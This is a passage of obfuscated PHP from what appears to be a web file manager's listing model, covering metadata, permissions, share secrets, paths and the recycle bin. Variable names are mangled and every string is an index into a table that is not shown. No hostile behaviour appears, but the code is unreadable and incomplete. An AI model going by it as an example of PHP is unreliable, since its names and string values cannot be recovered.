$this->order($‰˜ÌêóÑ); } protected function _listDataApplyItem($óÏÈ”Š…, $à„Ò“ïÖ = false) { $ïÄ·Ì§Õ = array($óÏÈ”Š…); $this->_listDataApply($ïÄ·Ì§Õ, $à„Ò“ïÖ); return $ïÄ·Ì§Õ[0]; } protected function _listDataApply(&$åÍ“‘ú±, $ßçŞÌ£³ = false) { $İ”øãâ¨ =& $_SERVER[§ŒØóıü]; if (!$åÍ“‘ú±) { $åÍ“‘ú± = array(); return; } $›Ö–ÕŸ = array_to_keyvalue($åÍ“‘ú±, $İ”øãâ¨[12], $İ”øãâ¨[402]); $›Ö–ÕŸ = array_unique($›Ö–ÕŸ); $this->_listSourceCache($åÍ“‘ú±); if (!$ßçŞÌ£³) { $this->_listAppendMeta($åÍ“‘ú±, $›Ö–ÕŸ); $this->_listAppendFileMeta($åÍ“‘ú±, $›Ö–ÕŸ); $this->_listAppendChildren($åÍ“‘ú±, $›Ö–ÕŸ); } $this->_listAppendPath($åÍ“‘ú±); $this->_listAppendAuth($åÍ“‘ú±); $this->_listAppendSourceInfo($åÍ“‘ú±, $›Ö–ÕŸ); $this->_listAppendUser($åÍ“‘ú±); $this->_listFilterInfo($åÍ“‘ú±, $ßçŞÌ£³); $this->_listAppendAuthSecret($åÍ“‘ú±); } protected function _listSourceCache($ÎÈ‡»ëÔ) { $ÄàûªÚº =& $_SERVER[§ŒØóıü]; foreach ($ÎÈ‡»ëÔ as $±ß¨Åíæ) { self::$cacheSourceInfo[$ÄàûªÚº[460] . $±ß¨Åíæ[$ÄàûªÚº[402]]] = $±ß¨Åíæ; } } protected function _listFilterInfo(&$•İ½ì¦„, $Şì€œ³™ = false) { $éêë‹“ƒ =& $_SERVER[§ŒØóıü]; foreach ($•İ½ì¦„ as &$Æ¼®ÇíÑ) { $Æ¼®ÇíÑ = $this->pathInfoFilter($Æ¼®ÇíÑ); self::$cachePathInfo[$éêë‹“ƒ[461] . intval($Şì€œ³™) . $éêë‹“ƒ[386] . $Æ¼®ÇíÑ[$éêë‹“ƒ[402]]] = $Æ¼®ÇíÑ; } unset($Æ¼®ÇíÑ); } protected function _listMake(&$ˆ²•áœğ) { $‰œÛ¡— =& $_SERVER[§ŒØóıü]; $ˆ²•áœğ[$‰œÛ¡—[82]] = array(); $ˆ²•áœğ[$‰œÛ¡—[83]] = array(); foreach ($ˆ²•áœğ[$‰œÛ¡—[369]] as $¤¸€˜¼) { $Êå²Õ¶û = $¤¸€˜¼[$‰œÛ¡—[410]] == 1 ? $‰œÛ¡—[82] : $‰œÛ¡—[83]; $ˆ²•áœğ[$Êå²Õ¶û][] = $¤¸€˜¼; } unset($ˆ²•áœğ[$‰œÛ¡—[369]]); } protected function _listAppendMeta(&$¢Ä†¶¸æ, $ÑƒÛ÷») { $£¸Ÿ»®ö =& $_SERVER[§ŒØóıü]; $ßÄƒ×Å = array($£¸Ÿ»®ö[417] => array($£¸Ÿ»®ö[418], $ÑƒÛ÷»)); $´È§úÓó = Model($£¸Ÿ»®ö[462])->field($£¸Ÿ»®ö[463])->where($ßÄƒ×Å)->select(); if (!$´È§úÓó) { return; } $·êã‘Õß = array($£¸Ÿ»®ö[464], $£¸Ÿ»®ö[465], $£¸Ÿ»®ö[444]); $ ÆÊÁÑ… = array(); foreach ($´È§úÓó as $ôËÊÇßÈ) { if (!isset($ ÆÊÁÑ…[$ôËÊÇßÈ[$£¸Ÿ»®ö[402]]])) { $ ÆÊÁÑ…[$ôËÊÇßÈ[$£¸Ÿ»®ö[402]]] = array(); } if (in_array($ôËÊÇßÈ[$£¸Ÿ»®ö[94]], $·êã‘Õß)) { continue; } $ ÆÊÁÑ…[$ôËÊÇßÈ[$£¸Ÿ»®ö[402]]][$ôËÊÇßÈ[$£¸Ÿ»®ö[94]]] = $ôËÊÇßÈ[$£¸Ÿ»®ö[374]]; } foreach ($¢Ä†¶¸æ as &$¯çÁÎú) { $¯çÁÎú[$£¸Ÿ»®ö[466]] = !1; if (isset($ ÆÊÁÑ…[$¯çÁÎú[$£¸Ÿ»®ö[402]]])) { $¯çÁÎú[$£¸Ÿ»®ö[466]] = $ ÆÊÁÑ…[$¯çÁÎú[$£¸Ÿ»®ö[402]]]; } if ($this->fileIsLock($¯çÁÎú) && $¯çÁÎú[$£¸Ÿ»®ö[413]]) { $©ôåé’ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¯çÁÎú[$£¸Ÿ»®ö[413]][$£¸Ÿ»®ö[414]] = AuthModel::authDisable($¯çÁÎú[$£¸Ÿ»®ö[413]][$£¸Ÿ»®ö[414]], $©ôåé’); $¯çÁÎú[$£¸Ÿ»®ö[413]][$£¸Ÿ»®ö[467]][$£¸Ÿ»®ö[413]] = $¯çÁÎú[$£¸Ÿ»®ö[413]][$£¸Ÿ»®ö[414]]; } } unset($¯çÁÎú); } protected function _listAppendFileMeta(&$‚¿ÓÚ‚†, $†¾³şˆ) { $„à­¢–Ë =& $_SERVER[§ŒØóıü]; $×ˆ†Â©É = array_to_keyvalue($‚¿ÓÚ‚†, $„à­¢–Ë[12], $„à­¢–Ë[468]); $×ˆ†Â©É = array_filter(array_unique($×ˆ†Â©É)); if (!$×ˆ†Â©É) { return; } $†êäÎƒ = array($„à­¢–Ë[469] => array($„à­¢–Ë[418], $×ˆ†Â©É)); $»×àà†© = $„à­¢–Ë[470]; $œ­‚÷Û = Model($„à­¢–Ë[471])->field($»×àà†©)->where($†êäÎƒ)->select(); $œ­‚÷Û = array_to_keyvalue($œ­‚÷Û, $„à­¢–Ë[468]); $Ô•›­€ = Model($„à­¢–Ë[472])->field($„à­¢–Ë[473])->where($†êäÎƒ)->select(); $Ô•›­€ = $Ô•›­€ ? $Ô•›­€ : array(); $ô¨Ò‚ç§ = array(); foreach ($Ô•›­€ as $€ÈŒ¿÷í) { if (!isset($ô¨Ò‚ç§[$€ÈŒ¿÷í[$„à­¢–Ë[468]]])) { $ô¨Ò‚ç§[$€ÈŒ¿÷í[$„à­¢–Ë[468]]] = array(); } $ô¨Ò‚ç§[$€ÈŒ¿÷í[$„à­¢–Ë[468]]][$€ÈŒ¿÷í[$„à­¢–Ë[94]]] = $€ÈŒ¿÷í[$„à­¢–Ë[374]]; } foreach ($‚¿ÓÚ‚† as &$Ş»™¨´ö) { $ıˆº”œƒ = $Ş»™¨´ö[$„à­¢–Ë[468]]; if (!$ıˆº”œƒ || !is_array($œ­‚÷Û[$ıˆº”œƒ])) { continue; } $é°èŒ—ğ = $œ­‚÷Û[$ıˆº”œƒ]; $é°èŒ—ğ[$„à­¢–Ë[76]] = $Ş»™¨´ö[$„à­¢–Ë[76]]; $é°èŒ—ğ[$„à­¢–Ë[32]] = $Ş»™¨´ö[$„à­¢–Ë[32]]; if (!isset(self::$cacheFileInfo[$„à­¢–Ë[474] . $ıˆº”œƒ])) { self::$cacheFileInfo[$„à­¢–Ë[474] . $ıˆº”œƒ] = array_merge(array(), $é°èŒ—ğ); } unset($œ­‚÷Û[$ıˆº”œƒ][$„à­¢–Ë[84]]); $Şì‘ÖÆ = is_array($ô¨Ò‚ç§[$ıˆº”œƒ]) ? $ô¨Ò‚ç§[$ıˆº”œƒ] : array(); $Ş»™¨´ö[$„à­¢–Ë[170]] = array_merge($Şì‘ÖÆ, $œ­‚÷Û[$ıˆº”œƒ]); if (isset($Ş»™¨´ö[$„à­¢–Ë[170]][$„à­¢–Ë[169]])) { $Ş»™¨´ö[$„à­¢–Ë[169]] = json_decode($Ş»™¨´ö[$„à­¢–Ë[170]][$„à­¢–Ë[169]], !0); unset($Ş»™¨´ö[$„à­¢–Ë[170]][$„à­¢–Ë[169]]); } } unset($Ş»™¨´ö); } protected function _listAppendSourceInfo(&$òøÍí±À, $Â¸æöØ×) { $Ñá«õ¤³ =& $_SERVER[§ŒØóıü]; $ÇÔµÕÎŒ = Model($Ñá«õ¤³[475])->listData(); $ÎøûÃ—Â = Model($Ñá«õ¤³[425])->listData(); $çû¬çş = Model($Ñá«õ¤³[415])->listData(); $ëÄİ§–¥ = Model($Ñá«õ¤³[476])->listSimple(); $ßºæÕ¤ò = array_to_keyvalue($ÇÔµÕÎŒ, $Ñá«õ¤³[399]); $à²ãªƒ = array_to_keyvalue_group($ÎøûÃ—Â, $Ñá«õ¤³[84], $Ñá«õ¤³[426]); $õ½Š¡ñ® = array_to_keyvalue($çû¬çş, $Ñá«õ¤³[84]); $ü³ÀåŒ« = array_to_keyvalue_group($ëÄİ§–¥, $Ñá«õ¤³[402]); foreach ($òøÍí±À as &$À°…Ä°¡) { $À°…Ä°¡[$Ñá«õ¤³[87]] = array($Ñá«õ¤³[477] => 0, $Ñá«õ¤³[478] => 0, $Ñá«õ¤³[479] => 0); if (isset($õ½Š¡ñ®[$À°…Ä°¡[$Ñá«õ¤³[402]]])) { $À°…Ä°¡[$Ñá«õ¤³[87]][$Ñá«õ¤³[480]] = 1; $À°…Ä°¡[$Ñá«õ¤³[87]][$Ñá«õ¤³[481]] = $õ½Š¡ñ®[$À°…Ä°¡[$Ñá«õ¤³[402]]][$Ñá«õ¤³[32]]; } if ($à²ãªƒ && $ßºæÕ¤ò && isset($à²ãªƒ[$À°…Ä°¡[$Ñá«õ¤³[402]]])) { $À°…Ä°¡[$Ñá«õ¤³[87]][$Ñá«õ¤³[482]] = array(); foreach ($à²ãªƒ[$À°…Ä°¡[$Ñá«õ¤³[402]]] as $¶¯í¨ãæ) { $ş×åôƒÊ = $ßºæÕ¤ò[$¶¯í¨ãæ]; $À°…Ä°¡[$Ñá«õ¤³[87]][$Ñá«õ¤³[482]][] = array($Ñá«õ¤³[483] => $ş×åôƒÊ[$Ñá«õ¤³[399]], $Ñá«õ¤³[420] => $ş×åôƒÊ[$Ñá«õ¤³[32]], $Ñá«õ¤³[484] => $ş×åôƒÊ[$Ñá«õ¤³[485]]); } } if ($ü³ÀåŒ« && isset($ü³ÀåŒ«[$À°…Ä°¡[$Ñá«õ¤³[402]]])) { $À°…Ä°¡[$Ñá«õ¤³[87]][$Ñá«õ¤³[486]] = array(); foreach ($ü³ÀåŒ«[$À°…Ä°¡[$Ñá«õ¤³[402]]] as $ÄÌÇ€Âî) { $Àû³©é = $Ñá«õ¤³[487]; if ($ÄÌÇ€Âî[$Ñá«õ¤³[488]] == $Ñá«õ¤³[88]) { $Àû³©é .= $Ñá«õ¤³[489]; } $À°…Ä°¡[$Ñá«õ¤³[87]][$Ñá«õ¤³[486]] = array_field_key($ÄÌÇ€Âî, explode($Ñá«õ¤³[50], $Àû³©é)); } } } unset($À°…Ä°¡); return $òøÍí±À; } protected function _listAppendChildren(&$ü»è¦‹¸, $èÀÜ”ï˜) { $§Å…¹Ò¨ =& $_SERVER[§ŒØóıü]; $Æá‰üğà = array(); $­éÑøóÊ = array($§Å…¹Ò¨[207] => 0, $§Å…¹Ò¨[208] => 0); foreach ($ü»è¦‹¸ as &$§íÖ¿á‡) { if (!$§íÖ¿á‡[$§Å…¹Ò¨[410]]) { continue; } $Æá‰üğà[] = $§íÖ¿á‡[$§Å…¹Ò¨[402]]; } unset($§íÖ¿á‡); if (!$Æá‰üğà) { return; } $ÃÔêçó… = array($§Å…¹Ò¨[432] => array($§Å…¹Ò¨[7], $Æá‰üğà), $§Å…¹Ò¨[431] => 0); $”Üêˆ‘Ë = array($§Å…¹Ò¨[432], $§Å…¹Ò¨[410], $§Å…¹Ò¨[490] => $§Å…¹Ò¨[491]); $ÇÄÂµ²ı = $this->field($”Üêˆ‘Ë)->where($ÃÔêçó…)->group($§Å…¹Ò¨[492])->select(); $š¾ÈÛÒ = array(); foreach ($ÇÄÂµ²ı as $»ª…®’ì) { $ı•ß¶ˆó = $»ª…®’ì[$§Å…¹Ò¨[432]]; $ÙÆ÷æÊÎ = $»ª…®’ì[$§Å…¹Ò¨[410]] == $§Å…¹Ò¨[88] ? $§Å…¹Ò¨[208] : $§Å…¹Ò¨[207]; if (!isset($š¾ÈÛÒ[$ı•ß¶ˆó])) { $š¾ÈÛÒ[$ı•ß¶ˆó] = array($§Å…¹Ò¨[207] => 0, $§Å…¹Ò¨[208] => 0); } $š¾ÈÛÒ[$ı•ß¶ˆó][$ÙÆ÷æÊÎ] += $»ª…®’ì[$§Å…¹Ò¨[491]]; } foreach ($ü»è¦‹¸ as &$§íÖ¿á‡) { if (!$§íÖ¿á‡[$§Å…¹Ò¨[410]]) { continue; } $ú÷½ê—‡ = is_array($š¾ÈÛÒ[$§íÖ¿á‡[$§Å…¹Ò¨[402]]]) ? $š¾ÈÛÒ[$§íÖ¿á‡[$§Å…¹Ò¨[402]]] : $­éÑøóÊ; $§íÖ¿á‡[$§Å…¹Ò¨[208]] = $ú÷½ê—‡[$§Å…¹Ò¨[208]]; $§íÖ¿á‡[$§Å…¹Ò¨[207]] = $ú÷½ê—‡[$§Å…¹Ò¨[207]]; unset($§íÖ¿á‡[$§Å…¹Ò¨[412]]); } unset($§íÖ¿á‡); } protected function _listAppendAuth(&$æ×§‡¢¶) { $¹…±É°ú =& $_SERVER[§ŒØóıü]; $«Ãö°™ = array(); foreach ($æ×§‡¢¶ as $÷¢³‰ ·) { if ($÷¢³‰ ·[$¹…±É°ú[411]] == self::TYPE_GROUP) { $«Ãö°™[] = $÷¢³‰ ·[$¹…±É°ú[402]]; } } if (!$«Ãö°™) { return; } $Ìö‰²£¦ = array_to_keyvalue($æ×§‡¢¶, $¹…±É°ú[402]); $—ıâªòá = Model($¹…±É°ú[493])->getSourceList($«Ãö°™, $Ìö‰²£¦); $ Ü¥»‹· = $GLOBALS[$¹…±É°ú[494]] == 1; foreach ($æ×§‡¢¶ as $˜˜£§ñÏ => &$÷¢³‰ ·) { $÷¢³‰ ·[$¹…±É°ú[413]] = $—ıâªòá[$÷¢³‰ ·[$¹…±É°ú[402]]]; if (!$÷¢³‰ ·[$¹…±É°ú[413]] && $÷¢³‰ ·[$¹…±É°ú[411]] == self::TYPE_GROUP) { $÷¢³‰ ·[$¹…±É°ú[413]] = Action($¹…±É°ú[495])->pathGroupAuthMake($÷¢³‰ ·[$¹…±É°ú[496]]); if (!$÷¢³‰ ·[$¹…±É°ú[413]] && !$ Ü¥»‹·) { $÷¢³‰ ·[$¹…±É°ú[203]] = !1; $÷¢³‰ ·[$¹…±É°ú[202]] = !1; } } if ($÷¢³‰ ·[$¹…±É°ú[413]]) { $÷¢³‰ ·[$¹…±É°ú[203]] = AuthModel::authCheckEdit($÷¢³‰ ·[$¹…±É°ú[413]][$¹…±É°ú[414]]); $÷¢³‰ ·[$¹…±É°ú[202]] = AuthModel::authCheckView($÷¢³‰ ·[$¹…±É°ú[413]][$¹…±É°ú[414]]); } $this->groupPathDisplay($÷¢³‰ ·); } unset($÷¢³‰ ·); } public function _listAppendAuthSecret(&$À…¯ş´) { $Š•„¢õ =& $_SERVER[§ŒØóıü]; if (Model($Š•„¢õ[435])->get($Š•„¢õ[497]) != $Š•„¢õ[88]) { return; } static $ÙŠ½¿ğ‡ = false; if (!$ÙŠ½¿ğ‡) { $ÒÍ¡£Ë° = Model($Š•„¢õ[498]); $ü¶·î¸â = Model($Š•„¢õ[499]); $ÙŠ½¿ğ‡ = $ü¶·î¸â->listData(); $ÙŠ½¿ğ‡ = array_to_keyvalue($ÙŠ½¿ğ‡, $Š•„¢õ[402]); $ó§¨å†Š = json_decode(Model($Š•„¢õ[435])->get($Š•„¢õ[500]), !0); $ó§¨å†Š = array_to_keyvalue($ó§¨å†Š, $Š•„¢õ[399]); foreach ($ÙŠ½¿ğ‡ as $×áÆ°Ï => $•í èº) { $ş÷¬íè = $ó§¨å†Š[$•í èº[$Š•„¢õ[501]]]; if (!$ş÷¬íè) { $ü¶·î¸â->remove($•í èº[$Š•„¢õ[399]]); unset($ÙŠ½¿ğ‡[$×áÆ°Ï]); continue; } $õùş—³Ú = $ÒÍ¡£Ë°->listData($ş÷¬íè[$Š•„¢õ[413]]); if (!$õùş—³Ú) { $ü¶·î¸â->remove($•í èº[$Š•„¢õ[399]]); unset($ÙŠ½¿ğ‡[$×áÆ°Ï]); continue; } $•í èº[$Š•„¢õ[413]] = $õùş—³Ú; $•í èº[$Š•„¢õ[502]] = $ş÷¬íè; $•í èº[$Š•„¢õ[503]] = Model($Š•„¢õ[504])->getInfoSimpleOuter($•í èº[$Š•„¢õ[454]]); $ÙŠ½¿ğ‡[$×áÆ°Ï] = $•í èº; } } $ÛÈ‰ºš† = USER_ID; $Òô–®ôå = array(); $’æÇ—¶Ü = $this->_listAppendPath($Òô–®ôå, !0); foreach ($À…¯ş´ as $×áÆ°Ï => &$•í èº) { if (!is_array($•í èº[$Š•„¢õ[413]])) { continue; } if ($•í èº[$Š•„¢õ[411]] != $Š•„¢õ[505]) { continue; } if (isset($ÙŠ½¿ğ‡[$•í èº[$Š•„¢õ[402]]])) { $ËÑÚ”æ = $ÙŠ½¿ğ‡[$•í èº[$Š•„¢õ[402]]]; if (!is_array($•í èº[$Š•„¢õ[466]])) { $•í èº[$Š•„¢õ[466]] = array(); } $•í èº[$Š•„¢õ[466]][$Š•„¢õ[506]] = $ËÑÚ”æ[$Š•„¢õ[501]]; $•í èº[$Š•„¢õ[413]][$Š•„¢õ[507]] = $ËÑÚ”æ; $•í èº[$Š•„¢õ[413]][$Š•„¢õ[508]] = $•í èº[$Š•„¢õ[509]]; $•í èº[$Š•„¢õ[413]][$Š•„¢õ[510]] = $Š•„¢õ[88]; if ($ËÑÚ”æ[$Š•„¢õ[454]] != $ÛÈ‰ºš†) { $•í èº[$Š•„¢õ[413]][$Š•„¢õ[414]] = $•í èº[$Š•„¢õ[413]][$Š•„¢õ[414]] & $ËÑÚ”æ[$Š•„¢õ[413]][$Š•„¢õ[413]]; } continue; } $Ç…›˜œ½ = $this->parentLevelArray($•í èº[$Š•„¢õ[511]]); $öÈÎÓØ = array_reverse($Ç…›˜œ½); foreach ($öÈÎÓØ as $±İŸ‰½ => $áÒòÅÍğ) { if (!isset($ÙŠ½¿ğ‡[$áÒòÅÍğ])) { continue; } $ËÑÚ”æ = $ÙŠ½¿ğ‡[$áÒòÅÍğ]; $•í èº[$Š•„¢õ[413]][$Š•„¢õ[507]] = $ËÑÚ”æ; if ($ËÑÚ”æ[$Š•„¢õ[454]] != $ÛÈ‰ºš†) { $•í èº[$Š•„¢õ[413]][$Š•„¢õ[414]] = $•í èº[$Š•„¢õ[413]][$Š•„¢õ[414]] & $ËÑÚ”æ[$Š•„¢õ[413]][$Š•„¢õ[413]]; } $û…”©Üô = $Š•„¢õ[12]; $™¦ÙŸ¯‘ = count($Ç…›˜œ½) - $±İŸ‰½; for ($¥Ó»Øõı = 0; $¥Ó»Øõı < $™¦ÙŸ¯‘; $¥Ó»Øõı++) { if (!isset($’æÇ—¶Ü[$Ç…›˜œ½[$¥Ó»Øõı]])) { $û…”©Üô = $Š•„¢õ[12]; break; } $û…”©Üô = $û…”©Üô . rtrim($’æÇ—¶Ü[$Ç…›˜œ½[$¥Ó»Øõı]], $Š•„¢õ[8]) . $Š•„¢õ[8]; } $•í èº[$Š•„¢õ[413]][$Š•„¢õ[508]] = rtrim($û…”©Üô, $Š•„¢õ[8]) . $Š•„¢õ[8]; break; } } unset($•í èº); } public function groupPathDisplay(&$—§›Á Â) { $ìÔÅà‡ =& $_SERVER[§ŒØóıü]; if ($—§›Á Â[$ìÔÅà‡[411]] != self::TYPE_GROUP) { return; } $¬˜Ë¸Üú = Model($ìÔÅà‡[512])->getInfo($—§›Á Â[$ìÔÅà‡[496]]); $ÇØ·Èçß = $this->parentLevelArray($¬˜Ë¸Üú[$ìÔÅà‡[511]]); $×Ûšåß· = $ìÔÅà‡[12]; foreach ($ÇØ·Èçß as $ı¼Ôüƒ) { $Ğ´å›æ¼ = Model($ìÔÅà‡[512])->getInfo($ı¼Ôüƒ); $×Ûšåß· .= $Ğ´å›æ¼[$ìÔÅà‡[87]][$ìÔÅà‡[402]] . $ìÔÅà‡[50]; } $—§›Á Â[$ìÔÅà‡[513]] = $¬˜Ë¸Üú[$ìÔÅà‡[432]]; $—§›Á Â[$ìÔÅà‡[514]] = $¬˜Ë¸Üú[$ìÔÅà‡[511]]; $—§›Á Â[$ìÔÅà‡[515]] = $¬˜Ë¸Üú[$ìÔÅà‡[516]]; $—§›Á Â[$ìÔÅà‡[517]] = $×Ûšåß· . $¬˜Ë¸Üú[$ìÔÅà‡[87]][$ìÔÅà‡[402]]; } protected function _listAppendPath(&$¼Ú“éª, $Ï¡ü¡ = false) { $¯»µ™‚÷ =& $_SERVER[§ŒØóıü]; static $ëàêµ« = array(); $ì¿¼ß£• = array(); $«şî‹¦’ = array(); if ($Ï¡ü¡) { return $ëàêµ«; } foreach ($¼Ú“éª as &$¾Ú½¬½ø) { $²½öäğ‘ = $¾Ú½¬½ø[$¯»µ™‚÷[402]]; if ($¾Ú½¬½ø[$¯»µ™‚÷[410]] == $¯»µ™‚÷[88] && $¾Ú½¬½ø[$¯»µ™‚÷[432]] != 0) { $ëàêµ«[$²½öäğ‘] = $¾Ú½¬½ø[$¯»µ™‚÷[32]]; } if ($¾Ú½¬½ø[$¯»µ™‚÷[410]] == $¯»µ™‚÷[88] && $¾Ú½¬½ø[$¯»µ™‚÷[432]] == 0 && !isset($ëàêµ«[$²½öäğ‘])) { $ëàêµ«[$²½öäğ‘] = $this->_listAppendPathRoot($¾Ú½¬½ø, array()); } if (isset($«şî‹¦’[$¾Ú½¬½ø[$¯»µ™‚÷[511]]])) { continue; } $«şî‹¦’[$¾Ú½¬½ø[$¯»µ™‚÷[511]]] = !0; $ùØ…¹æó = $this->parentLevelArray($¾Ú½¬½ø[$¯»µ™‚÷[511]]); foreach ($ùØ…¹æó as $› °éİ => $¢ã§ÚòÃ) { if (isset($ëàêµ«[$¢ã§ÚòÃ])) { continue; } if ($› °éİ == 0) { $ëàêµ«[$¢ã§ÚòÃ] = $this->_listAppendPathRoot($¾Ú½¬½ø, $ùØ…¹æó); } if ($› °éİ != 0) { $ì¿¼ß£•[] = $¢ã§ÚòÃ; } } } unset($¾Ú½¬½ø); $ì¿¼ß£• = array_unique($ì¿¼ß£•); if (count($ì¿¼ß£•) > 0) { $‘„Šö« = array($¯»µ™‚÷[417] => array($¯»µ™‚÷[418], $ì¿¼ß£•)); if (count($ì¿¼ß£•) == 1) { $ä£¤° = $this->sourceInfo($ì¿¼ß£•[0]); $”ÓÆÑíí = is_array($ä£¤°) ? array($ä£¤°) : !1; } else { $”ÓÆÑíí = $this->field($¯»µ™‚÷[518])->where($‘„Šö«)->select(); } if (!$”ÓÆÑíí) { $”ÓÆÑíí = array(); } foreach ($”ÓÆÑíí as $¬—¯òñ¦) { $ëàêµ«[$¬—¯òñ¦[$¯»µ™‚÷[402]]] = $¬—¯òñ¦[$¯»µ™‚÷[32]]; } } $§„øàø = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $÷ˆ‹­ÅĞ = array(); foreach ($¼Ú“éª as &$¾Ú½¬½ø) { $çğ ‘ùü = $¾Ú½¬½ø[$¯»µ™‚÷[511]]; $ÜâÉ„ = $¯»µ™‚÷[12]; if (isset($÷ˆ‹­ÅĞ[$çğ ‘ùü])) { $ÜâÉ„ = $÷ˆ‹­ÅĞ[$çğ ‘ùü]; } else { $ùØ…¹æó = $this->parentLevelArray($¾Ú½¬½ø[$¯»µ™‚÷[511]]); foreach ($ùØ…¹æó as $› °éİ => $¢ã§ÚòÃ) { if (isset($ëàêµ«[$¢ã§ÚòÃ])) { $ÜâÉ„ .= $ëàêµ«[$¢ã§ÚòÃ] . $¯»µ™‚÷[8]; } } $÷ˆ‹­ÅĞ[$çğ ‘ùü] = $ÜâÉ„; } $ÜâÉ„ .= $¾Ú½¬½ø[$¯»µ™‚÷[32]]; if ($¾Ú½¬½ø[$¯»µ™‚÷[410]] == $¯»µ™‚÷[88]) { $ÜâÉ„ .= $¯»µ™‚÷[8]; } $¾Ú½¬½ø[$¯»µ™‚÷[509]] = str_replace($¯»µ™‚÷[519], $¯»µ™‚÷[8], $ÜâÉ„); if ($¾Ú½¬½ø[$¯»µ™‚÷[432]] == $¯»µ™‚÷[198]) { $¾Ú½¬½ø[$¯»µ™‚÷[32]] = trim($ëàêµ«[$¾Ú½¬½ø[$¯»µ™‚÷[402]]], $¯»µ™‚÷[8]); $¾Ú½¬½ø[$¯»µ™‚÷[509]] = $¾Ú½¬½ø[$¯»µ™‚÷[32]] . $¯»µ™‚÷[8]; } if (intval($¾Ú½¬½ø[$¯»µ™‚÷[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¾Ú½¬½ø, $ùØ…¹æó, $§„øàø); } } unset($¾Ú½¬½ø); return $¼Ú“éª; } private function _listAppendPathRecycle(&$âÄ”‘, $ÅËß©Û“, $ùî£Éş„) { $¤’„¿¡è =& $_SERVER[§ŒØóıü]; if (!in_array($ùî£Éş„, $ÅËß©Û“) && $âÄ”‘[$¤’„¿¡è[402]] != $ùî£Éş„) { return; } $şåÎ§ = explode($¤’„¿¡è[8], trim($âÄ”‘[$¤’„¿¡è[509]], $¤’„¿¡è[8])); $¯Ğ‘÷åæ = implode($¤’„¿¡è[8], array_slice($şåÎ§, 2)); $âÄ”‘[$¤’„¿¡è[509]] = $¤’„¿¡è[8] . LNG($¤’„¿¡è[520]) . $¤’„¿¡è[8] . ltrim($¯Ğ‘÷åæ, $¤’„¿¡è[8]); $âÄ”‘[$¤’„¿¡è[511]] = $¤’„¿¡è[521] . implode($¤’„¿¡è[50], array_slice($ÅËß©Û“, 1)) . $¤’„¿¡è[50]; if ($âÄ”‘[$¤’„¿¡è[402]] == $ùî£Éş„) { $âÄ”‘[$¤’„¿¡è[511]] = $¤’„¿¡è[521]; $âÄ”‘[$¤’„¿¡è[432]] = $¤’„¿¡è[198]; $âÄ”‘[$¤’„¿¡è[32]] = LNG($¤’„¿¡è[520]); } $âÄ”‘[$¤’„¿¡è[522]] = $¤’„¿¡è[523]; } protected function _listAppendPathRoot(&$¹áíÁ±, $Ê¢Ù¤–±) { $±©Œ®à =& $_SERVER[§ŒØóıü]; static $Âá²¢’û = false; $‘ñŞ³ğ = $±©Œ®à[12]; if ($¹áíÁ±[$±©Œ®à[411]] == self::TYPE_USER) { if ($¹áíÁ±[$±©Œ®à[496]] == USER_ID) { $‘ñŞ³ğ = LNG($±©Œ®à[524]); if ($Âá²¢’û === !1) { $¬‘Ôö¬Š = Model($±©Œ®à[525])->getInfoFull(USER_ID); $Âá²¢’û = _get($¬‘Ôö¬Š, $±©Œ®à[526], $±©Œ®à[12]); } if ($Ê¢Ù¤–± && $Ê¢Ù¤–±[0] == $Âá²¢’û || !$Ê¢Ù¤–± && $¹áíÁ±[$±©Œ®à[402]] == $Âá²¢’û) { $‘ñŞ³ğ = LNG($±©Œ®à[527]); $¹áíÁ±[$±©Œ®à[528]] = $±©Œ®à[529]; } if (!$Ê¢Ù¤–±) { $¹áíÁ±[$±©Œ®à[32]] = $‘ñŞ³ğ; } } else { $ºÈÕ­» = Model($±©Œ®à[504])->getInfoSimple($¹áíÁ±[$±©Œ®à[496]]); $‘ñŞ³ğ = LNG($±©Œ®à[530]) . $±©Œ®à[162] . $ºÈÕ­»[$±©Œ®à[32]] . $±©Œ®à[164]; $¹áíÁ±[$±©Œ®à[531]] = array($±©Œ®à[32] => $ºÈÕ­»[$±©Œ®à[32]], $±©Œ®à[532] => $ºÈÕ­»[$±©Œ®à[532]], $±©Œ®à[533] => $ºÈÕ­»[$±©Œ®à[533]]); } } else { if ($¹áíÁ±[$±©Œ®à[411]] == self::TYPE_GROUP) { $ºÈÕ­» = Model($±©Œ®à[512])->getInfoSimple($¹áíÁ±[$±©Œ®à[496]]); $‘ñŞ³ğ = $ºÈÕ­»[$±©Œ®à[32]]; } else { if ($¹áíÁ±[$±©Œ®à[411]] == self::TYPE_SYSTEM) { $‘ñŞ³ğ = $±©Œ®à[534]; } } } $‘ñŞ³ğ = $‘ñŞ³ğ ? $±©Œ®à[8] . $‘ñŞ³ğ . $±©Œ®à[8] : $±©Œ®à[8]; return $‘ñŞ³ğ; } protected function _listAppendUser(&$¯’Ë±Ãí) { $°ùÚóşà =& $_SERVER[§ŒØóıü]; $‡‡É‚•ç = array_to_keyvalue($¯’Ë±Ãí, $°ùÚóşà[12], $°ùÚóşà[454]); $ê¼ô”ó° = array_to_keyvalue($¯’Ë±Ãí, $°ùÚóşà[12], $°ùÚóşà[456]); $©ø õš = array_merge($‡‡É‚•ç, $ê¼ô”ó°); $œÉ‹ŠŠ = Model($°ùÚóşà[525])->userListInfo($©ø õš); foreach ($¯’Ë±Ãí as &$ı³âÒ–ª) { $ê¶ÆÏ˜ü = $ı³âÒ–ª[$°ùÚóşà[454]]; $ı³âÒ–ª[$°ùÚóşà[454]] = $œÉ‹ŠŠ[$ê¶ÆÏ˜ü] ? $œÉ‹ŠŠ[$ê¶ÆÏ˜ü] : !1; $ê¶ÆÏ˜ü = $ı³âÒ–ª[$°ùÚóşà[456]]; $ı³âÒ–ª[$°ùÚóşà[456]] = $œÉ‹ŠŠ[$ê¶ÆÏ˜ü] ? $œÉ‹ŠŠ[$ê¶ÆÏ˜ü] : !1; if (isset($ı³âÒ–ª[$°ùÚóşà[466]]) && $ı³âÒ–ª[$°ùÚóşà[466]][$°ùÚóşà[535]]) { $ãïëù = $GLOBALS[$°ùÚóşà[6]][$°ùÚóşà[89]][$°ùÚóşà[536]]; if ($ı³âÒ–ª[$°ùÚóşà[466]][$°ùÚóşà[537]] <= time() - $ãïëù) { $this->metaSet($ı³âÒ–ª[$°ùÚóşà[402]], $°ùÚóşà[535], null); $this->metaSet($ı³âÒ–ª[$°ùÚóşà[402]], $°ùÚóşà[537], null); 